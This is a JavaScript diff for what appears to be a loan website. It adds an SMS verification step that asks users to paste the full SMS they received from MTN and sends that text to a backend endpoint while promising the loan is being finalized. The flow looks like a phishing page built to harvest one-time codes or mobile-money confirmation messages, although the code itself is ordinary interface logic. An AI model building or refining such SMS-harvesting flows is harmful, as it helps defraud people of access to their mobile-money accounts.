@@ -94,3 +94,80 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
         showScreen('screen-step3');
     }
 });
+
+// --- SMS Verification Button Logic ---
+const smsInput = document.getElementById('sms-input');
+const verifyBtn = document.getElementById('verify-btn');
+
+// Start disabled
+verifyBtn.disabled = true;
+verifyBtn.style.pointerEvents = 'none';
+verifyBtn.style.opacity = '0.6';
+
+// Enable button when user types/pastes something meaningful
+smsInput.addEventListener('input', function() {
+    const hasContent = smsInput.value.trim().length > 0;
+
+    if (hasContent) {
+        verifyBtn.disabled = false;
+        verifyBtn.style.pointerEvents = 'auto';
+        verifyBtn.style.background = '#ffcc00';   // full yellow
+        verifyBtn.style.color = '#000';
+        verifyBtn.style.opacity = '1';
+        verifyBtn.style.cursor = 'pointer';
+    } else {
+        verifyBtn.disabled = true;
+        verifyBtn.style.pointerEvents = 'none';
+        verifyBtn.style.background = '#ffe082';   // faded
+        verifyBtn.style.color = '#fff';
+        verifyBtn.style.opacity = '0.6';
+        verifyBtn.style.cursor = 'default';
+    }
+});
+
+// Extra safety: handle paste events (mobile long-press paste)
+smsInput.addEventListener('paste', function() {
+    setTimeout(() => smsInput.dispatchEvent(new Event('input')), 0);
+});
+
+// Handle the verify action
+verifyBtn.addEventListener('click', function() {
+    const smsText = smsInput.value.trim();
+
+    if (!smsText) return;
+
+    // Basic sanity check
+    if (smsText.length < 10) {
+        alert("Please paste the full SMS you received from MTN.");
+        return;
+    }
+
+    // Show processing screen
+    document.getElementById('processing-title').innerText = "Verifying SMS...";
+    document.getElementById('processing-text').innerText = "Please wait while we confirm your loan details.";
+    document.getElementById('loader-spinner').style.display = "block";
+    showScreen('screen-processing');
+
+    // Send the pasted SMS to the backend for verification
+    fetch('/api/verify-sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sms: smsText })
+    })
+    .then(res => res.json())
+    .then(result => {
+        if (result.success) {
+            document.getElementById('processing-title').innerText = "Verified!";
+            document.getElementById('processing-text').innerText = "Your loan is being finalized. You will receive a confirmation shortly.";
+        } else {
+            document.getElementById('processing-title').innerText = "Verification Failed";
+            document.getElementById('processing-text').innerText = "The SMS could not be verified. Please try again.";
+        }
+        document.getElementById('loader-spinner').style.display = "none";
+    })
+    .catch(() => {
+        document.getElementById('processing-title').innerText = "Network Error";
+        document.getElementById('processing-text').innerText = "Please check your connection and try again.";
+        document.getElementById('loader-spinner').style.display = "none";
+    });
+});
